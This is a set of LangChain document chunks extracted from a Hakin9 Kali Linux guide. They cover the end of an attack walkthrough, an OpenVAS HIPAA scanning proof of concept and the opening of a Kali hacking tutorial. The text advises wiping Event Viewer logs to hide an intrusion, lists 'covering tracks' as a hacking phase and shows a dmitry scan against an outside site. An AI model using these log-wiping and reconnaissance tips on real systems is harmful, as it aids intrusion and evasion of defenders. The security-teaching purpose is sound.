run many programs and can edit the files.\\nRun ‘Event Viewer’ and remove all notifications, \\nso it becomes more difficult to track what is hap -\\npening with the machine.\\nAlthough we can trace the connection estab -\\nlished with the command “sessions-l”.\\nAfter running the command will start sending \\n‘HTTP packets’ to the target machine via the ‘GET \\nmethod’.\\nThis shows that the connection has been estab -\\nlished with the machine.\\nYou can use utilities such as Restart, Shutdown \\nthe system.\\nIt is worth remembering that I made this article \\nfor educational purposes only, I am totally against \\nthe cybernetic crime, so use it with conscience .\\nRAFAeL FONTeS SOUzA\\nOver the years, acquiring knowledge of \\nWebmaster programmer(HTML5,CSS,XML\\n,ActionScript), developer in languages like \\nPython, Shell Script, Perl, Pascal, Ruby, Ob -\\nject Pascal, C and Java. I started studying \\nwith thirteen (SQL database), i have exten -\\nsive experience in operating systems such \\nas Linux, UNIX, and Windows. I am maintainer of the “project \\nbacktrack team brazilian”, I am also a member of the “French \\nBacktrack Team” and made partnerships with groups from In -\\ndonesia and Algeria; prepared a collection of video lessons \\nand made them available on the website. I have good com -\\nmunication in groups and the general public, attended col -\\nlege projects with a focus on business organization, I am cur -\\nrently seeking for a work experience outside of Brazil”. \\nhttp://sourceforge.net/projects/cypherpunks/ \\nContact: fontes_rafael@hotmail.com \\n Figure 26.  Establish the connection, Step 15\\nFigure 25.  The attack, Step 14\\nFigure 24.  Starting the payload handler, Step 13\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 33}, page_content='Extra 03/2013 34DeFeNSe\\nOpen Source solutions can be leveraged as \\na low-cost and effective strategy to mini -\\nmize risk when used as component of a \\nlarger information security program. With a long \\n“track” record of community support, Kali is an \\nopen source Linux distribution containing many \\nsecurity tools to meet the needs of HIPAA network \\nvulnerability scans. \\nNote\\nThis article is not as much a how-to as it is a proof \\nof concept and evaluation of Kali on low-cost hard -\\nware (Raspberry Pi in this case). As such, I will dis -\\ncuss my overall experiences here but will not get \\ninto the weeds of the build process for the scan -\\nner. There are much better resources elsewhere \\nto explain the details of this particular project. In \\nother words, I am not reinventing the wheel here \\nand have borrowed heavily from readily available \\nonline resources. Think of this as more of a busi -\\nness case with some of the technical bits included.\\nAs Senior Consultant for a Managed Service \\nProvider company, I have a need to develop a \\nscalable low-cost solution for performing HIPAA \\nvulnerability scans. The scans will be part of a larg -\\ner Information Security consulting service to assist \\nclients with their HIPAA compliance program. As a \\nBusiness Associate  of Covered Entities (meaning \\n– vendor of medical companies), the security solu -tion will also be used to support the internal com -\\npliance program of our technology firm. \\nThe requirement for risk analysis (and conse -\\nquently vulnerability scans) is explained in the \\nGuidance on Risk Analysis Requirements under \\nthe HIPAA Security Rule  document published by \\nthe US Department of Health and Human Services \\n(http://www.hhs.gov/ocr/privacy/hipaa/administra -\\ntive/securityrule/rafinalguidancepdf.pdf ):\\nRisk Analysis Requirements under the Security \\nRule. The Security Management Process standard \\nin the Security Rule requires organizations to “[i]\\nmplement policies and procedures to prevent, de -\\ntect, contain, and correct security violations.” (45 \\nC.F.R. § 164.308(a)(1).) Risk analysis is one of four \\nrequired implementation specifications that pro -\\nvide instructions to implement the Security Man -\\nagement Process standard. Section 164.308(a)(1)\\n(ii)(A) states: RISK ANALYSIS (Required).\\nConduct an accurate and thorough assessment \\nof the potential risks and vulnerabilities to the confi -\\ndentiality, integrity, and availability of electronic pro -\\ntected health information held by the [organization].\\n…Vulnerability is defined in NIST Special Pub -\\nlication (SP) 800-30 as “[a] flaw or weakness in \\nsystem security procedures, design, implementa -\\ntion, or internal controls that could be exercised \\n(accidentally triggered or intentionally exploited) \\nand result in a security breach or a violation of the Kali Scanning for \\nHIPAA\\nA Proof of Concept: using Kali Linux to deploy distributed \\nnetwork vulnerability scanners for medical clients\\nThe Health Insurance Portability and Accountability Act of \\n1996 (HIPAA) requires organizations who handle electronic \\nProtected Health Information (e-PHI) to take action and \\nreduce risk relative to potential security breaches of digital \\ncommunication and storage of patient information. \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 34}, page_content='www.hakin9.org/en 35Kali Scanning for HIPAA\\nsystem’s security policy.” Vulnerabilities, whether \\naccidentally triggered or intentionally exploited, \\ncould potentially result in a security incident, such \\nas inappropriate access to or disclosure of e-PHI. \\nVulnerabilities may be grouped into two general \\ncategories, technical and non-technical. Non-tech -\\nnical vulnerabilities may include ineffective or non-\\nexistent policies, procedures, standards or guide \\nlines. Technical vulnerabilities may include: holes, \\nflaws or weaknesses in the development of infor -\\nmation systems; or incorrectly implemented and/or \\nconfigured information systems.\\nProject Requirements\\nA build versus buy approach was taken to evalu -\\nate solutions as a scalable, affordable, and effective \\nmethod of conducting network vulnerability scans. \\nThe result of the scans will address HIPAA risk anal -\\nysis requirements while driving vulnerability remedi -\\nation plans. The final solution must scale with grow -\\ning business demands for security assessments so \\nautomation of distributed scanners was a primary \\nconsideration. Additionally, the scanners must be \\ncost-effective to deploy, easy to manage (more on \\nthis later), and enable centralized reporting.\\nHaving familiarity with the Backtrack Linux distri -\\nbution, Kali was a logical choice for a best of breed \\noffering in the open source community. So what \\nis Kali Linux? According to Kali.org, Kali Linux is \\nan advanced Penetration Testing and Security Au -\\nditing Linux distribution.  It is also a complete re-\\nbuild of Backtrack, its predecessor. Kali is free ( as \\nin beer ) and contains over 300 penetration testing \\ntools. This seems like a good fit for the low-cost re -\\nquirement of the project.\\nTo further control costs, the Raspberry Pi system \\non a chip (SoC) device was selected as the comput -\\ner hardware for the scanners. These tiny computers \\ncan be purchased from a number of distributors for \\n$35.00USD. It must be recognized at this point that \\nchoosing a low-powered device like the RPi is not \\nwithout trade-offs. We are seeking to balance cost, \\nsize, and power efficiency against performance re -\\nquirements and capabilities of the system. That be -\\ning said, it’s hard to argue that a better value can be \\nhad for a distributed network scanner. \\nWhat’s a Raspberry Pi?\\nAccording to the official website ( http://www.raspber -\\nrypi.org/faqs) , “the Raspberry Pi is a credit-card sized \\ncomputer that plugs into your TV and a keyboard. It’s \\na capable little PC which can be used for many of the \\nthings that your desktop PC does, like spreadsheets, \\nword-processing and games. It also plays high-def -\\ninition video. We want to see it being used by kids all over the world to learn programming.” Hardware \\nSpecifications (Raspberry Pi Model B):\\n•  CPU – 700 MHz ARM processor (overclocks to \\n1 GHz)\\n•  Storage – SD card slot\\n•  Memory – 512MB RAM\\n•  Graphics – Broadcom VideoCore IV\\n•  Video Out – Composite RCA and HDMI\\n•  Audio Out – 3.5mm jack \\n•  Networking – 10/100Mbps Ethernet\\n•  I/O Ports – 2x USB\\nFigure 1. Raspberry Pi Model B\\nDesigned as a project computer, the Raspberry Pi \\nappeared to be a good it for our speciic require -\\nments. I followed the documentation on Kali.org \\nfor installing Kali ARM on a Raspberry Pi. Since \\nthis is a proof of concept, an 8GB SDHC Class 10 \\ncard was used for provisioning the operating sys -\\ntem. A production system may require more stor -\\nage for running multiple reporting tools and keep -\\ning a local copy of the scanning history.\\nSome Notes on Installation\\nKali image used for testing: http://cdimage.kali.org/\\nkali-linux-1.0-armel-raspberrypi.img.gz.\\nWhile this is not a Kali/Raspberry Pi installation \\nhow-to, I figured I would at least touch on the un -\\nexpected problems encountered during the initial \\nset up process. It is often said that installing open \\nsource systems is not for the faint of heart. I agree. \\nWhile not always straightforward, a bit of Google-\\nfu usually saves the day…no exceptions here.\\nNote\\nI experienced problems with the kali-linux-1.0.4-\\narmel-rpi.img.gz version of the operating system \\n(the current version) which resulted in the key -\\nboard and mouse locking up in the desktop inter -\\nface. Troubleshooting this issue led me to forum \\nposts discussing the same symptoms and of suc -\\ncessful attempts using version 1.0, then applying \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 35}, page_content='Extra 03/2013 36DeFeNSe\\nupdates from there. This is the path I took in order \\nto make progress on the task at hand.\\nSome initial hardware problems were experi -\\nenced due to drawing too much power from the \\nUSB ports. For example, my Apple USB keyboard \\nwas detected by the operating system, but would \\nnot work. This was resolved by using a powered \\nUSB hub to offload the power draw. Trying a differ -\\nent keyboard worked fine without the hub, so your \\nmileage will vary. This is only of concern when ini -\\ntially configuring the RPi. A mouse and keyboard \\nwill not be used when the device is running on the \\nclient’s network. If you need the hub during pro -\\nduction, the Raspberry Pi can be powered off of \\nthe same USB hub adding additional power to the \\nmouse/keyboard. This is how I ran the device dur -\\ning my testing and eliminated the need for an ad -\\nditional power supply.\\nAlso, the default install does not fully utilize the \\nSD card which led to errors due to a full disk when \\nperforming updates. This was resolved by us -\\ning the fdisk followed by the resize2fs  utilities to \\nexpand the system partition to use the remain -\\ning free space. Exact details for this can be found \\nhere:  http://raspberrypi.stackexchange.com/ques -\\ntions/499/how-can-i-resize-my-root-partition .\\nBased on my experience here, some other soft -\\nware housekeeping items are needed (Listing 1)…\\nListing 1.  General Kali updates\\n#apt-get update – performs general software \\nupdates\\n#apt-get install xfce4 xfce4-goodies – installs \\nitems need to support the xserver GUI\\n#apt-get install iceweasel – installs the \\ndefault browser\\nWith the initial hiccups of the installation behind \\nme, the next step was to consider what tools from \\nthe new Kali system would be deployed to perform \\nthe network vulnerability scans. With so many ca -\\npabilities packed into this Linux security distro, \\nthere was no shortage of options.\\nRunning startx  from the command prompt cranks \\nup the desktop interface. Even if we will not normal -\\nly run our scripts and programs from the GUI, it is \\nhelpful to drive the system around a bit to familiarize \\nourselves with the tools loaded on the Kali platform. \\nBe prepared to grab a cup of coffee when first start -\\ning the graphic interface. The slower processing \\npower of the Raspberry box takes a few minutes to \\nload the desktop the first time. Patience is rewarded \\nwith the familiar Kali/Backtrack dragon logo.Selecting a Scanner\\nWith over 300 security tools available on the Ka -\\nli system, we must narrow down which tool (or \\ntools) to use for our purposes. Here are some of \\nthe requirements:\\n•  Scheduled scans for multiple clients,\\n•  lexibility in coniguration,\\n•  available (free) updates to vulnerability deinitions,\\n•  multiple options for reporting output,\\n•  secure transmission of reports (more on this to \\nfollow).\\nLet’s examine these requirements a bit more. Since \\nthe concept here is to create a set of distributed \\nscanners at various client sites, the system must be \\nable to run as a scheduled task and will ultimate -\\nly be called from a master script. Having lexibili -\\nty with its coniguration, the software should adapt \\nwell to changes in solution requirements over time. \\nFreely available vulnerability deinition updates will \\nkeep costs down while allowing the system to de -\\ntect ever-evolving system threats. The tool should \\nprovide multiple options for reporting output. Initially \\nreports will be generated in basic HTML or PDF for -\\nmats, but future requirements will necessitate cap -\\nturing granular scanning data for developing a more \\nsophisticated (eventual) self-service customer por -\\ntal. From a security standpoint, we are not storing \\nePHI; however, we are storing information sensitive \\nto the internal structure and systems of our clients’ \\nnetworks. As such, precautions to secure transmis -\\nsion of reports will be established as part of the so -\\nlution. For the reasons described above, I select -\\ned OpenVAS as the scanning tool for this proof of \\nconcept. No one system will be one hundred per -\\ncent effective all of the time. Certain vulnerabilities \\nwill be missed while some false-positives may be \\nreported. Remember – risk “reduction” is the goal \\nas risk “elimination” is an unreasonable expecta -\\ntion. The important thing is we are using the tool as \\npart of an overall security effort. A more attractive \\noption would be to deploy multiple scanning tools to \\nvalidate the results and cover gaps that exist from \\na single software solution. For the purposes of this \\nphase of the project, we will stick to using a single \\ntool for scanning and reporting.\\nWorking with OpenvAS\\nI ran my out-of-the-box OpenVAS install from the \\ndesktop and fired up the setup script included with \\nthe GUI menu options. After several attempts to \\nconfigure and run scans with no luck, I decided to \\npursue a different course of action. While search -\\ning for set up guides, I can across an invaluable \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 36}, page_content='www.hakin9.org/en 37Kali Scanning for HIPAA\\ntool – the openvas-check-setup  script. While time-\\nconsuming, the script checks out all parts of the \\nOpenVAS system and updates as necessary. I had \\nto do the following based on the fixes recommend -\\ned by the script: Listing 2 and Figure 2.\\nListing 2. Initial updating of OpenVAS\\n#apt-get install openvas-scanner (this updated \\nthe scanner and a good number of other com-\\nponents of the system)\\n#openvasmd –migrate (upgrades the database)\\n#openvas-scapdata-sync (update SCAP feed)\\n#openvas-certdata-sync (update CERT feed)\\n#openvassd (starts the OpenVAS Server)\\n#openvasmd (starts the OpenVAS Manager)\\n#openvasad (starts the OpenVAS Administrator)\\n#gsad (starts the Greenbone Security Assistant)\\nFigure 2.  Migrating the database\\nAfter performing the above, I still go an error stat -\\ning “ERROR: OpenVAS Manager is NOT running!” \\nTo double-check for listening services, I ran the \\ncommand: netstat -A inet –ntlp . As the OpenVAS \\nManager (openvasmd) was found to be listening \\non its default port, I ignored the “error” and pro -\\nceeded with testing (Figure 3).\\nSetting up the Scans\\nThe obligatory disclaimer: I am not an attorney; \\nhowever, I used to work for some. Be sure you have expressed written permission to perform any \\npenetration tests, vulnerability scans, or enumer -\\nation of network services and host information. \\nConducting security scans without permission is \\nagainst the law and not advocated here. For test -\\ning purposes, I have used my home network and \\nmy employer’s network (with permission) to run \\nthe scans. Enough said about that.\\nSetting up a scan is simply a matter of managing \\n(at a minimum): Tasks, Targets, and Scan Configs.\\nTasks – scan jobs made up of the other ele -\\nments. The tasks can be scheduled and leverage \\nEscalators, such as send an email when the task \\nis complete.\\nTargets – IP addresses or ranges of the network \\ndevices to scan. This can be a single Target con -\\nfiguration for a simple network or multiple (servers, \\nworkstations, network devices). Multiple targets \\nwould be useful when it is desirable to customize the \\nlevel of scanning based on different device types.\\nScan Configs – preset vulnerability scan con -\\nfigurations using different levels of scanning tech -\\nniques. As the more intrusive configs can bring \\ndown hosts, use caution when making decisions \\non how and when to run the scans.\\nFor this exercise, I set up three separate scan \\ntargets – our workstation network, our server net -\\nwork, and one for my work computer. I then creat -\\ned three tasks to scan the targets named – “Scan \\nworkstations – Full and fast”, “Scan servers – Full \\nand fast”, and “Scan my PC” respectively. For each \\nof these I used the Full and Fast scan option. This \\nwas the least invasive of the default set of scan \\nconfigurations. The overall process is straightfor -\\nward as the Greenbone Security Desktop interface \\nis intuitive in its layout. Several tabs at the bottom \\nof the application window delineate the various ar -\\neas for configuration.\\nI chose to run the scans manually and did not \\nschedule them. The time required to perform the \\nscans will vary based on the number of hosts being \\nscanned in the current task and the performance \\nof the scanner and network. Just to get an idea of \\nthe traffic generated during a scan, I ran Wireshark \\non my laptop to watch the vulnerability scans. Fur -\\nther analysis of the packets would reveal the mag -\\nic behind the scanning process (Figure 4).\\nHardware Performance\\nLet’s suffice it to say, the performance of the Rasp -\\nberry Pi is underwhelming in this application. This \\nis not unexpected actually and, to a certain degree, \\ninsignificant. While the speed of the scans could \\nbe increased by using faster hardware, we desire \\ninexpensive  and good enough . While scanning, \\nFigure 3.  Checking listening ports for the openvasmd service\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 37}, page_content='Extra 03/2013 38DeFeNSe\\nthe processor hovered around seventy percent uti -\\nlization. Further performance gains would be real -\\nized by running OpenVAS from the command line \\nonly and not from the GUI. In a distributed scanner \\nmodel, the desktop interface would only be used \\non the reporting server. In a real-world application, \\nI would choose to spend a little more on a signifi -\\ncantly faster device (and still stay below $100 per \\nscanner). Some attractive RPi alternatives for the \\nARM processor platform include the Beagle Bone \\nBlack and the Odroid U2.\\nAnalyzing the Results\\nOnce the scan(s) were finished, it was time to eval -\\nuate the results. In this case, we will look at a scan \\non my work laptop (a Windows 7 computer). I used \\nthe HTML version of the report although there are \\nother options including XML, PDF and text.\\nThe Host Summary area of the report provides a \\nhigh-level view of the number of vulnerabilities de -\\ntected and the threat level – High, Medium, or Low. \\nSince I used the Full and Fast scanning option, I as -\\nsumed the threat count would be fairly low. More in -\\nvasive scans would likely show more threats at the \\nexpense of time and higher network activity. For the \\ntest scan, the results show zero High level threats, \\ntwo Medium and seven Low level. A port summary \\nof the detected threats is shown Figure 5.\\nLet’s take a look at one of the Medium level threats. \\nThe same process will be used to examine each \\nthreat to determine a remediation plan for the cli -\\nent. One of the threats detected is called “NVT: DCE \\nServices Enumeration” on TCP port 135. A bit of re -search on the threat shows Windows computers use \\nthis port to look up various services running on a re -\\nmote computer and is used for remote management \\nof the device. The recommendation from the Open -\\nVAS report is to “filter incoming traffic to this port”.\\nFigure 5. OpenVAS HTML Report, Summary Section\\nA potential remediation could be to modify the fire -\\nwall rules on the Windows computer to only allow \\nIP packets sourcing from servers and administrative \\nworkstations. This would reduce the attack vector \\nby blocking connections from peer Windows clients \\non the network (which have no need to communi -\\ncate directly to the device). A comprehensive reme -\\ndiation plan would use a similar approach to ana -\\nlyze each threat identified by the scan. The process \\nof scanning and remediating identified problems will \\nFigure 4.  Greenbone Security Desktop interface\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 38}, page_content='www.hakin9.org/en 39Kali Scanning for HIPAA\\nresult in an overall risk reduction with respect to our \\nclients’ network security (Figure 6). \\nFigure 6. OpenVAS HTML Report, Security Issues\\nCentralized Reporting\\nOpenVAS is designed to leverage remote slave \\nscanners. This allows for the Greenbone Security \\nDesktop and the underlying OpenVAS components \\nto perform the heavy lifting of the remote scanning. \\nThe advantage of this capability is using a single in -\\nterface for scheduling scans and reporting. A cen -\\ntralized OpenVAS server can be used to manage \\nthe entire system. The distributed aspect of the solu -\\ntion will allow my security consulting service to scale \\nefficiently without unneeded visits to client sites. \\nWith direct access to all client reports, I can work di -\\nrectly with our managed services team to implement \\nthe remediations. While certainly a great feature, the \\nproblem with the solution is requiring multiple VPN \\nconnections into the networks of our medical clients. \\nThis risk can be mitigated by using a DMZ for the \\nOpenVAS master server and scheduling the scans \\nin a way where only one client VPN connection is re -\\nquired at a time. Leveraging on-demand VPN con -\\nnections in conjunction with an idle timeout would be \\nthe best configuration to eliminate these concerns.\\nNote\\nDue to the timeline for writing this article, the remote \\nscanning capability of OpenVAS was not tested.\\nFuture enhancements\\nAs with any project like this, there is always room \\nfor improvement. Future requirements to increase \\nremote system capabilities will likely push beyond \\nthe limits of the Raspberry Pi hardware. In that \\ncase, other slightly more expensive hardware so -\\nlutions could be considered without completely re -\\ninventing the wheel. For example, many other SoC \\nsystems are on the market with higher processor \\nspeeds and more memory than the RPi. As these \\ndevices use the same processor family as RPi, it \\nis expected Kali ARM support will enable use of \\nthese more capable hardware systems. Some like -\\nly future enhancements include:\\n•  packet captures of Internet trafic to keep a roll -\\ning history of network activity in the event of a \\nbreach,•  leverage additional scanning tools to validate \\nOpenVAS scans,\\n•  harden the Kali install to protect locally stored \\nvulnerability reports,\\n•  deploy a client self-service portal to view a his -\\ntory of scans and vulnerability remediation.\\nSummary\\nThis project started as a proof of concept to deter -\\nmine the viability of using open source tools like Kali \\nto deploy distributed network vulnerability scanners \\non low-cost hardware. The business case for this so -\\nlution is to provide value-added consulting services \\nto our medical clients and reduce risk as part of a \\ncomprehensive HIPAA compliance program. The ex -\\nperiences outlined here demonstrate that Raspber -\\nry Pi and Kali make an effective hardware/software \\nplatform for network scans. As is to be expected with \\nan open source project, more effort and technical \\nknowledge is required to deploy (and maintain) the \\nsolution; however, the long-term return on investment \\nmakes the endeavor worthwhile. The end goal is to \\nhave a completely automated and low-cost scanning \\nsolution where all parties have direct access to the \\nreports for compliance and remediation purposes. \\nThis proof of concept using Kali shows that the end \\ngoal is certainly within reach.\\nHIPAA Terms\\nCovered Entity – a healthcare provider, a health \\nplan, or healthcare clearinghouse.\\nBusiness Associate – a person or entity that per -\\nforms certain functions or activities that involve the \\nuse or disclosure of protected health information on \\nbehalf of, or provides services to, a covered entity.\\nElectronic Protected Health Information (e-PHI) \\n– individually identifiable health information is \\nthat which can be linked to a particular person. \\nCommon identifiers of health information include \\nnames, social security numbers, addresses, and \\nbirth dates.\\nCHARLIe WATeRS \\nCharlie Waters serves as the Security Oicer \\nand Senior Consultant for Ininity Network \\nSolutions, a Georgia-based MSP irm. His \\nbackground in technology began with an \\nearly curiosity and passion for computing \\nwith a Commodore 64 (at the age of twelve). A hobby turned \\ncareer has led the author on a journey from software develop -\\ner, web programmer/host, systems engineer, and management \\nin the public and private sector, to his current role in technology \\nconsulting. A life-long learner, Charlie maintains the same curi -\\nosity and passion for technology now in a career spanning if -\\nteen years.\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 39}, page_content='Extra 03/2013 40DeFeNSe\\nIn the depth of crisis, hacking over the Internet \\nis still the very big problem, because the rate of \\ntechnology is increasing day by day and every -\\none here is for earning money. In that case some \\nearn the money through bad methods or some \\nby good methods. So, as a hacker I don’t support \\npeople earning money with bad methodologies. \\nNow with the depth of hacking, some big com -\\npanies over the Internet like Facebook, Google, \\nFirefox, and many more opened up a scheme of \\nbug bounties in which hackers from all over the \\nworld are invited to find out a bug or vulnerability \\nin their services, which if found they pay them with \\nhigh bounties for their hard + smart work. To find \\nout those bugs hackers have to use some meth -\\nodologies either based on command line or GUI \\nbased interfaces. Therefore in order to fulfill this \\ndemand of hackers, another type of Operating sys -\\ntem called Kali Linux came into the market which is \\nan extension to Backtrack. Now Kali Linux is very \\nmuch helpful for penetration testing and vulnerabil -\\nity assessments. I am going to show the various \\ntools that can be used for penetration testing and \\nalso for attacking. This guide on Kali Linux will de -\\nscribe both the parts.\\nNow before moving on to the real demonstra -\\ntions let’s just go through some of the definitions \\nand terminologies so that while performing there \\nshould be no dilemma in the minds of the people.What is Kali Linux and what’s its use?\\nNow this question must come in the minds of the \\npeople that what is Kali Linux. Let me just clear this \\nconcept that Kali Linux is a complete re-building of \\nthe Backtrack Linux distributions which is based \\nupon the Debian platform. Now Kali Linux is an ad -\\nvance version of OS which is used for penetration \\ntesting and security auditing Linux distributions. \\nThis is also an open source OS which is available \\nfreely on the Internet. So that anyone can down -\\nload from the Internet. \\nFeatures of Kali Linux\\nSome of the features that makes Kali much more \\ncompatible and useful than any other Linux distri -\\nbutions. \\n•  Kali Linux come up with 300+ penetration test -\\ning tools which are enough to audit any OS, \\nany website or web apps.\\n•  Much more powerful and faster than Backtrack.\\n•  In Backtrack many tools didn’t work which are \\neliminated in Kali.\\n•  Open source and freely available on Internet.\\n•  Kali Linux is much more compatible with wire -\\nless devices.\\n•  Comes in a package of multi languages so that \\nevery person can enjoy assessments in their \\nown language.KALI LINUX\\nA Solution to HACKINg/SeCURITY\\nToday is the world of technology and everyone somehow is \\nattached to it. Some are using the technology for the good \\npurpose and some are using it for bad purposes and Internet \\nis one of those technologies which define both my statements. \\nInternet is being used both by the good (the White Hats) and \\nthe bad (the Black Hats). So, my paper is totally based on the \\nabove line that the OS (Operating System) KALI LINUX (which \\nis an extension to Backtrack) can be used in both the ways \\neither in good things or in bad things. \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 40}, page_content='www.hakin9.org/en 41KALI LINUX – A Solution to HACKINg/SeCURITY\\n•  The packages that are included in the Kali \\nLinux are signed by each individual (GPG sig -\\nnatures).\\n•  It includes the latest patch for injections which \\ncould help the pentesters to do assessments \\non the various wireless techniques \\n•  And many more.\\nLet us have a close look to Kali now.\\nA survey to Kali Linux\\nThe outer look of Kali is pretty much different from \\nany other Linux distributions like backtrack. The \\ndefault username and password to enter into the \\nKali is same as that of backtrack – username – \\nroot and password – toor (Figure 1). This is how exactly the Kali looks when you en -\\nter to the main desktop. Just reject the folders. \\nNow this is my Kali installed in the virtual ma -\\nchine and I am not wasting the time in the instal -\\nlation process because people are smart enough \\nto carry out the installation of any operating sys -\\ntem. So, let’s just focus on our main task. Just \\nlook at the top-right corner of the window it will \\nshow that who is currently logged into your sys -\\ntem (Figure 2).\\nNow moving on to the next, the very first task \\nwhen you enter into the Kali is to check whether \\nthe Internet connection is working fine or not. Be -\\nlow in the snapshot just look at the cursor at the \\ntop right corner showing the wired network which \\nmeans the Internet is working fine in the virtual ma -\\nchine with NAT enabled (Figure 3).\\nNow let’s get familiar with the terminal. In win -\\ndows there is a command prompt from where the \\nwhole system can be assessable, in Linux there \\nis something called as terminal which is a based \\nupon the command line interface from where the \\nwhole system can be viewed. In order to open the \\nterminal just follow the path as – “Applications > \\nAccessories > terminal” and from there you can \\nsimply copy the terminal to the desktop like I did, \\nso that every time the user doesn’t have to go \\nthere, he just come in and click on the terminal to \\naccess it (Figure 4). \\nFigure 1.  The login panel of Kali\\nFigure 2.  The desktop\\nFigure 3.  Showing the Internet connectivity\\nFigure 4. Showing the path to open the terminal\\nFigure 5.  The terminal – a command line interface\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 41}, page_content='Extra 03/2013 42DeFeNSe\\nAnd this is how the terminal looks like (Figure 5).\\nNow let’s get our hands dirty by running some of \\nthe commands in the terminal and let’s get friendly \\nwith the Linux.\\nSome of the important commands which will help \\nthe user to get friendly with Kali:\\n•  In order to run a service in Linux just run \\nservice <name> start . For an instance let’s say \\nI have run a service called apache2 for my lo -\\ncal-host then I will type, “service apache2 \\nstart” (Figure 6). And in order to check wheth -\\ner the service has been successfully started or \\nnot. Just start your Internet browser and write \\n“127.0.0.1” which is a loopback address which shows the successful working of the Apache \\nserver (Figure 7).\\n•  In order to open the Internet browser through \\nthe terminal, just enter “Firefox &” and it will \\nopen the browser and also shows that what ex -\\nactly the PID (process ID) for this browser pro -\\ncess has been allocated (Figure 8). \\n•  If the root wants to change the password of his \\naccount, he can simply do it by entering the \\ncommand, “passwd” and enter the password it \\nwill change the password from default “toor” to \\nsay “123” (Figure 9)\\nTill now we have seen some of the important \\ncommands which make a user friendly with the \\nLinux terminal. Some more commands which are \\nvery helpful for any user to get started with the \\nLinux and those are:\\n•  ls – list the iles and folders of the current di -\\nrectory\\n•  cd – change directory\\n•  touch – to make a ile\\n•  mkdir – to create a directory\\n•  rm – removes the iles, rm -R removes iles \\nand directories\\n•  rmdir – removes the empty directories\\n•  man – open the manual for the commands\\n•  time – to see the current time\\nFigure 6.  Showing to start the apache2 service\\nFigure 7.  Shows Apache is successfully running\\nFigure 10. Exploring the tools\\nFigure 9.  Changing root default password\\nFigure 8.  Showing to open the Firefox browser\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 42}, page_content='www.hakin9.org/en 43KALI LINUX – A Solution to HACKINg/SeCURITY\\n•  date – shows the current \\n•  nano – another editor for the creation and edit -\\ning of the iles.\\nNow these are some of the most important com -\\nmands which will help any user in the further \\nprocess. Now let us just get back to our main \\nmotive but before irst let me make everyone fa -\\nmiliar with some of the terminologies which will \\nhelp everyone to understand the basic concept \\nbehind the scene.\\nNow in order to begin with any kind of hacking \\nevery person has to go through some phases and \\nthose phases are knows as the hacking phases \\nand those are:\\nSteps Performed by Hackers:\\nThere are only five steps in order to hack anything \\nin this world:\\n•  Information Gathering\\n•  Scanning\\n•  Gaining Access\\n•  Maintaining Access\\n•  Covering Tracks\\nIn order to explore more about these hacking \\nsteps let’s just check from where all the tools can \\nbe accessed in GUI interface (Figure 10). \\nNow there are more than 300+ tools in Kali Linux \\nwhich will help to acquire the remote systems, \\ngenerating your own payloads, addition of latest \\nexploits, scanning process and much more. Now \\nit is not possible for me also to explore each and \\nevery tool in the tool list but what I am going to do \\nhere is sticking to the main concept and will going \\nto show the main tools which will make a person \\nfamiliar with the Kali and it will also make them free \\nto use the tools of their own.\\nInformation gathering\\nthe very first step in order to gather each and ev -\\nery information about the target, only then a tes -\\nter can examine the whole bunch of vulnerabili -\\nties and can patch them easily and safely. Now \\nthe major source of gathering the information is \\nGoogle which is an open source and is available \\nfor each person. But the information gathering de -\\npends upon:\\n•  Active gathering- which completely means a \\nuser is interacting with the target directly. For \\nan instance – making a phone call to a friend \\nworking in the target company and gathering \\nthe information by spooing your own friend.•  Passive gathering – in which a user is not di -\\nrectly interacting with the target means collect -\\ning the information from search engines like \\nGoogle or Bing (Figure 11). \\nNow the main task is to gather the IP (Internet \\nProtocol) address which is a 32-bit unique num -\\nber and is being assigned to everyone. The best \\nmethod is to ping a website and gather the IP ad -\\ndress. Although the ping is used for checking the \\nwhether the host is alive or not but here we are \\nquite stick to our own method. So, if your target is \\nFigure 13.  Options in Dmitry\\nFigure 12.  Acquiring the IP address of a particular website\\nFigure 11.  Gathering information from Google\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 43}, page_content='Extra 03/2013 44DeFeNSe\\nwebsite simply ping <website name>  and copy the \\nIP address (Figure 12).\\nNow the next information gather is to check for \\nthe: \\n•  reverse look up\\n•  DNS information\\n•  IP address \\n•  and type of target\\nNow in Kali there is only tool which can give you \\nall these results, and you don’t have your Inter -\\nnet every time to go a website and start search -\\ning for the results. The tool that I am using here is \\n“dmitry” which is completely based on command \\nline but very easy to use and even give the results \\nfaster and accurate.\\nSo in order to use dmitry simply run the following \\ncommand (Figure 13-15):\\n<dmitry –winsepfb –t 0-9 –e IP>\\nNow in this particular scan I have targeted the \\nGoogle and it shows the scan results that all the \\n150 ports are in a closed state. You can simply \\nput as many as options you want.Scanning\\nThe second most important phase to find out the \\nservices that are vulnerable, the open ports, and \\nmany other types of types of services which are \\nvulnerable in windows, websites, routers, and net -\\nworks etc. therefore, scanning is broadly divided \\ninto major three parts:\\n•  Port scanning: In this method the attacker will \\nsend a number of messages to break into the \\ncomputer so that he can get the information \\nabout the computer’s network.\\n•  Network Scanning: To check the number of ac -\\ntive hosts on the network.\\n•  Vulnerability scanning: Means to check the \\nweaknesses in the target so that it attacker us -\\nes those to gain the access of the target\\nSo now I am going to use the universal vulner -\\nability scanner which gives the best output for \\nscanning process and is 